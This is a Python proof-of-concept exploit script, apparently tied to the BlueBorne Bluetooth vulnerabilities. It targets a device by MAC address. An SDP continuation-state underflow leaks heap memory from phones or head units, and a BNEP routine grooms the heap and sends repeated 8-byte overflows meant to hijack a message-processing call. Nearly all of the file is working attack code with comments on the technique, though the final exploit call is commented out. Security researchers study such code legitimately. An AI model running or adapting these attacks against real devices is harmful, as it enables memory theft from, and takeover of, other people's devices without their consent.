#!/usr/bin/env python3

# python stuff
import struct
import socket
import logging
import argparse
import binascii
import select
import time
import sys


# blueborne stuff
import btsock
import sdp

# This is required to assure than the SDP respones are splitted to multiple fragments,
# thus assuering that cont_state is attached to the responses.
MIN_MTU = 48
SDP_PSM = 1
BNEP_PSM = 15
PWNING_TIMEOUT = 3 # seconds

PHONE = False

def hexdump(src, length=16):
  result = []
  digits = 4 if isinstance(src, str) else 2
  for i in range(0, len(src), length):
    s = src[i:i+length]
    hexa = " ".join(map("{0:0>2X}".format,s))
    text = "".join([chr(x) if 0x20 <= x < 0x7F else "." for x in s])
    result.append("%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )
  return "\n".join(result)

def progress(index, length):
  bar_length = 30  # should be less than 100
  percent = 100.0*index/length
  sys.stdout.write('\r')
  sys.stdout.write("Completed: [{:{}}] {:>3}%".format('='*int(percent/(100.0/bar_length)), bar_length, int(percent)))
  sys.stdout.flush()

def do_exploit(src, dst, numTimes):
  # this exploit requires us to connect to the device for now ...
  logging.warning(f"authenticating from {src} to {dst} ...")
  bnep = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
  bnep.bind((src, 0))
  bnep.connect((dst, BNEP_PSM))
  logging.success(f'connected to {dst}')

  # Each of these messages causes BNEP code to send 100 "command not understood" responses.
  # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
  # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
  # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
  for i in range(20):
    progress(i, 20)
    bnep.send(binascii.unhexlify('8109' + '800109' * 100))
  print('') # clear progress bar
  
  # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
  # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
  # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
  # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
  # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
  for i in range(100000):
    progress(i, 100000)
    # If we're blocking here, the daemon has crashed
    _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
    if not writeable:
      print('') # clear progress bar
      logging.success("looks like exploit worked!") 
      return
    bnep.send(binascii.unhexlify('810100') + struct.pack('<III', 0x41414141, 0x41414141, 0x41414141))
  print('') # clear progress bar
  logging.error("target BT stack is still up? likley did not work ...")
  
def do_leak(src, dst, numTimes):
  """
  This function assumes that L2CAP_UUID response would be larger than ATT_UUID response
  (This will than lead to payloadthe underflow of rem_handles)
  """
  logging.warning(f"using SDP to connect from {src} to {dst} ...")
  socket = btsock.l2cap_connect((dst, SDP_PSM), (src, 0), MIN_MTU)
  if PHONE:
    socket.send(sdp.pack_search_request(sdp.L2CAP_UUID))
    response = sdp.unpack_sdp_pdu(socket.recv(4096))
    response['payload'] = sdp.unpack_search_response(response['payload'])
  else:
    # HEADUNIT ONLY
    resp_gen = sdp.do_search_attr_request_full(socket, [sdp.PUBLIC_BROWSE_GROUP_UUID], [0])
    cstate = b''
    for r in resp_gen:
      response = r[1]
      if response["payload"]["cstate"] != "":
        logging.info(f"got cstate {response['payload']['cstate']}")
        cstate = response["payload"]["cstate"]
        break
    if cstate == b"":
      logging.error("Did not get cstate?")
      socket.close()
      return
  result = []
  for i in range(numTimes):
    progress(i, numTimes)
    cstate = response['payload']['cstate']
    if cstate == b"":
      logging.error("Did not get cstate?")
      socket.close()
      return
    socket.send(sdp.pack_search_request(sdp.ATT_UUID, cstate=cstate))
    response = sdp.unpack_sdp_pdu(socket.recv(4096))
    response['payload'] = sdp.unpack_search_response(response['payload'])
    for record in response['payload']['records']:
      for b in record.to_bytes(4, 'little'):
        result.append(b)
  print('') # clear progress bar
  return result

if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser()
  parser.add_argument('-s', dest='source_bmac', help='source BMAC', type=str, required=True)
  parser.add_argument('-t', dest='target_bmac', help='target BMAC', type=str, required=True)
  parser.add_argument('-n', dest='leak_number', help='number of times to leak target', type=int, required=True, default=100)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.addLevelName(logging.DEBUG,   '\033[0m\033[1;35mTEST\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  logging.info('STARTING')
  leak_info = do_leak(args.source_bmac, args.target_bmac, args.leak_number)
  if logging.getLogger().getEffectiveLevel() == logging.DEBUG:
    logging.debug(f"dropping leak hexdump:")
    print(hexdump(leak_info))
  logging.warning('running exploit')
  #do_exploit(args.source_bmac, args.target_bmac, args.leak_number)
  logging.info('DONE')
